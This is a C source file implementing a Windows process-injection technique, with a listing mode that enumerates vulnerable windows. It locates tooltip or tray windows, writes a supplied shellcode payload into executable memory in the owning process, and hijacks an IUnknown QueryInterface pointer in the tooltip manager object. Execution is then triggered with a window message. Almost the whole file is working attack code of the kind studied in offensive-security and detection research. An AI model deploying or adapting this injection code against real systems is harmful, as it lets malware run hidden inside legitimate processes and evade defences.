/**
  Copyright © 2019 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */
  
#include "../ntlib/util.h"

// classes that work
PWCHAR class[]=
{ L"tooltips_class32",
  L"ForegroundStaging",
  L"Shell_TrayWnd",
  NULL};
  
    LPVOID  pic;
    DWORD   len;
    
typedef struct _IUnknown_VFT {
    // IUnknown
    LPVOID QueryInterface;
    LPVOID AddRef;
    LPVOID Release;
    
    // everything from here could be anything
    // we're only interested in the IUnknown interface
    ULONG_PTR padding[128];
} IUnknown_VFT;

VOID comctrl_inject(PWCHAR cls, LPVOID payload, DWORD payloadSize) {
    HWND         hw = 0;
    SIZE_T       rd, wr;
    LPVOID       ds, cs, p, ptr;
    HANDLE       hp;
    DWORD        pid;
    IUnknown_VFT unk;
    
    // 1. find a tool tip window.
    //    read index zero of window bytes
    for(;;) {
      hw = FindWindowEx(NULL, hw, cls, NULL);
      if(hw == NULL) return;
      printf("Found window %p.\n", (LPVOID)hw);
      p = (LPVOID)GetWindowLongPtr(hw, 0);
      if(p != NULL) break;
    }
    GetWindowThreadProcessId(hw, &pid);
    printf("Found window bytes %p in %i.\n", p, pid);
    
    // 2. open the process and read CToolTipsMgr
    
    hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if(hp == NULL) return;
    ReadProcessMemory(hp, p, &ptr, sizeof(ULONG_PTR), &rd);
    ReadProcessMemory(hp, ptr, &unk, sizeof(unk), &rd);
    
    // 3. allocate RWX memory and write payload there.
    //    update callback
    cs = VirtualAllocEx(hp, NULL, payloadSize, 
      MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(hp, cs, payload, payloadSize, &wr);
    
    // 4. allocate RW memory and write updated CToolTipsMgr
    unk.QueryInterface = cs;
    ds = VirtualAllocEx(hp, NULL, sizeof(unk),
      MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    WriteProcessMemory(hp, ds, &unk, sizeof(unk), &wr);
    
    printf("Updating..");
    
    // 5. update pointer, trigger execution
    WriteProcessMemory(hp, p, &ds, sizeof(ULONG_PTR), &wr);
    PostMessage(hw, WM_USER, 0, 0);
    Sleep(1000);
    
    // 6. restore original pointer and cleanup
    WriteProcessMemory(hp, p, &ptr, sizeof(ULONG_PTR), &wr);    
    VirtualFreeEx(hp, cs, 0, MEM_DECOMMIT | MEM_RELEASE);
    VirtualFreeEx(hp, ds, 0, MEM_DECOMMIT | MEM_RELEASE);
    CloseHandle(hp);
}

// GetWindowModuleFileName doesn't always work.
PWCHAR wnd2proc(HWND hw) {
    PWCHAR         name=L"N/A";
    DWORD          pid;
    HANDLE         ss;
    BOOL           bResult;
    PROCESSENTRY32 pe;
    
    GetWindowThreadProcessId(hw, &pid);
    
    ss = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    
    if(ss != INVALID_HANDLE_VALUE) {
      pe.dwSize = sizeof(PROCESSENTRY32);
      
      bResult = Process32First(ss, &pe);
      while (bResult) {
        if (pe.th32ProcessID == pid) {
          name = pe.szExeFile;
          break;
        }
        bResult = Process32Next(ss, &pe);
      }
      CloseHandle(ss);
    }
    return name;
}

PWCHAR addr2sym(HANDLE hp, LPVOID addr) {
    WCHAR        path[MAX_PATH];
    BYTE         buf[sizeof(SYMBOL_INFO)+MAX_SYM_NAME*sizeof(WCHAR)];
    PSYMBOL_INFO si=(PSYMBOL_INFO)buf;
    static WCHAR name[MAX_PATH];
    
    ZeroMemory(path, ARRAYSIZE(path));
    ZeroMemory(name, ARRAYSIZE(name));
          
    GetMappedFileName(
      hp, addr, path, MAX_PATH);
    
    PathStripPath(path);
    
    si->SizeOfStruct = sizeof(SYMBOL_INFO);
    si->MaxNameLen   = MAX_SYM_NAME;
    
    if(SymFromAddr(hp, (DWORD64)addr, NULL, si)) {
      wsprintf(name, L"%s!%hs", path, si->Name);
    } else {
      lstrcpy(name, path);
    }
    return name;
}

// WorkerA or WorkerW created by SHCreateWorkerWindowW
BOOL IsClassPtr(HWND hwnd, LPVOID ptr) {
    MEMORY_BASIC_INFORMATION mbi;
    DWORD                    res, pid;
    HANDLE                   hp;
    LPVOID                   ds;
    SIZE_T                   rd;
    BOOL                     bClass = FALSE;
    
    if(ptr == NULL) return FALSE;
    
    GetWindowThreadProcessId(hwnd, &pid);
    hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if(hp == NULL) return FALSE;
    
    SymSetOptions(SYMOPT_DEFERRED_LOADS);
    SymInitialize(hp, NULL, TRUE);
    
    // read first value of pointer
    ReadProcessMemory(hp, ptr, &ds, sizeof(ULONG_PTR), &rd);
    
    // query the pointer
    res = VirtualQueryEx(hp, ds, &mbi, sizeof(mbi));
    if(res != sizeof(mbi)) return FALSE;
    
    bClass = ((mbi.State   == MEM_COMMIT    ) &&
              (mbi.Type    == MEM_IMAGE     ) && 
              (mbi.Protect == PAGE_READONLY));
            
    if(bClass) {
      printf("%ws - ", addr2sym(hp, ptr));
      printf("%ws - ", addr2sym(hp, ds));
    }
    SymCleanup(hp);
    CloseHandle(hp);
    
    return bClass;
}

BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam) {
    WCHAR    cls[MAX_PATH];
    PWCHAR   filter = (PWCHAR)lParam;
    LPVOID   cs;
    DWORD    pid;
    
    GetClassName(hwnd, cls, MAX_PATH);
    
    // filter specified?
    if(filter != NULL) {
      // does class match our filter? skip printing if not
      if(StrStrI(cls, filter) == NULL) goto L1;
    }
    cs = (LPVOID)GetWindowLongPtr(hwnd, 0);
    GetWindowThreadProcessId(hwnd, &pid);
    
    if(IsClassPtr(hwnd, cs)) {
      printf("%p %p %-40ws %ws : %i\n", 
          hwnd, cs, cls, wnd2proc(hwnd), pid);
    }
    
L1:
    EnumChildWindows(hwnd, EnumWindowsProc, lParam);
    
    return TRUE;
}

VOID comctrl_list(PWCHAR filter) {
    EnumWindows(EnumWindowsProc, (LPARAM)filter);
}
    
int main(void) {
    int     argc;
    WCHAR **argv, *filter = NULL;
    
    argv = CommandLineToArgvW(GetCommandLineW(), &argc);

    if(argc == 3) {
      len = readpic(argv[1], &pic);
      if (len==0) {
        printf("unable to read %ws.\n", argv[1]);
      } else {
        comctrl_inject(argv[2], pic, len);
      }
    } else if(argc <= 2) {
      if(argc == 2) filter = argv[1];
      comctrl_list(filter);
    }
      
    return 0;
}
